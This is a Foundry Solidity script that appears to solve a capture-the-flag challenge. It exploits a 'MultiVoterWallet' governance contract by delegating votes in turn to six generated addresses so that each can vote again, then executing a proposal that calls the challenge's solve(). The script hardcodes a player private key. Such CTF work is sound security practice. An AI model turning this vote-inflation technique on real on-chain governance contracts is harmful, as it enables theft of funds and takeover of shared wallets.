// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/Setup3.sol";
import {MultiVoterWallet} from "../src/MultiVoterWallet.sol";
import {console} from "forge-std/console.sol";

contract MultiVoterScript is Script {
    function run() external {
        // Challenge address (replace with actual address)
        address challengeAddr = address(
            0x4D86bB7fA5430Ace83b2886c6934e0d189c17027
        );
        uint256 playerPrivateKey = uint256(
            0xcdce3fb366787eed1632007a2e8cec8728fe8d461b474e979bfdada13954425a
        );
        Setup setup = Setup(challengeAddr);
        MultiVoterWallet wallet = setup.wallet();

        console.log("wallet address: %s", address(wallet));

        // Generate 6 addresses with known private keys
        uint256[] memory privateKeys = new uint256[](6);
        address[] memory voters = new address[](6);

        uint idx = 18;
        for (uint i = idx; i < idx + 6; i++) {
            // Generate deterministic private keys
            privateKeys[i - idx] = uint256(
                keccak256(abi.encodePacked("voter", i))
            );
            voters[i - idx] = vm.addr(privateKeys[i - idx]);
        }

        (
            address delegatee,
            address owner,
            bool registered,
            uint256 voteCount,
            uint256 validVotes
        ) = wallet.voters(address(0xBe8A959533A4A91B57E8e981DE0ee0cFeE9f0364));
        console.log("delegatee: %s", delegatee);
        console.log("owner: %s", owner);
        console.log("registered: %s", registered);
        console.log("voteCount: %s", voteCount);
        console.log("validVotes: %s", validVotes);

        vm.startBroadcast();

        // Fund each address with 1 ETH
        for (uint i = 0; i < voters.length; i++) {
            payable(voters[i]).transfer(1 ether);
        }

        // Create proposal to call solve()
        bytes memory data = abi.encodeCall(Setup.solve, ());
        uint256 proposalId = wallet.propose(challengeAddr, data);
        console.log("proposalId: %d", proposalId);
        vm.stopBroadcast();

        // Delegate votes to all generated addresses
        for (uint i = 0; i < voters.length; i++) {
            vm.startBroadcast(playerPrivateKey);
            wallet.delegate(voters[i]);
            vm.stopBroadcast();
            vm.startBroadcast(privateKeys[i]);
            wallet.vote();
            vm.stopBroadcast();
        }

        vm.startBroadcast(playerPrivateKey);
        wallet.execute();
        vm.stopBroadcast();

        // check if the challenge is solved
        console.log("isSolved: %s", setup.isSolved());
    }
}
